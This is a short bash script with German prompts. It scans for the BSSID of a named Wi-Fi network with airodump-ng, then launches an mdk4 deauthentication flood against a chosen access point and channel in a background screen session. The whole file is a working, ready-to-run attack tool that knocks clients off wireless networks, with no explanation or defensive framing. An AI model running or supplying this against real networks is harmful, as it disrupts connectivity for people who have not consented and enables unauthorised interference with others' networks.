#!/bin/bash

function get_bssid {
    local interface=$1
    local essid=$2

    airodump-ng "$interface" --essid "$essid" --output-format csv -w output

    local bssid=$(tail -n 1 output-01.csv | cut -d ',' -f 1)

    echo "Die BSSID für ESSID '$essid' ist: $bssid"

    rm output-01.csv output-01.kismet.csv
}

function perform_deauth {
    local interface=$1
    local channel=$2
    local bssid=$3

    screen -dmS deauth mdk4 "$interface" d -c "$channel" -B "$bssid"

    echo "Deauthentication-Angriff gestartet für BSSID '$bssid'."

}

while true; do
    echo "Gib die ESSID ein:"
    read essid

    echo "Gib deine WLAN-Schnittstelle ein:"
    read interface

    get_bssid "$interface" "$essid"

    read -p "Möchtest du ein weiteres Netzwerk auslesen? (ja/nein): " execute

    if [[ "${execute,,}" != "ja" ]]; then
        break
    fi
done

read -p "Möchtest du ein Netzwerk angreifen? (ja/nein): " execute

if [[ "${execute,,}" == "ja" ]]; then
    echo "Gib die Netzwerkarte an:"
    read interface

    echo "Gib den Channel an:"
    read channel

    echo "Gib die BSSID an:"
    read bssid

    perform_deauth "$interface" "$channel" "$bssid"
fi
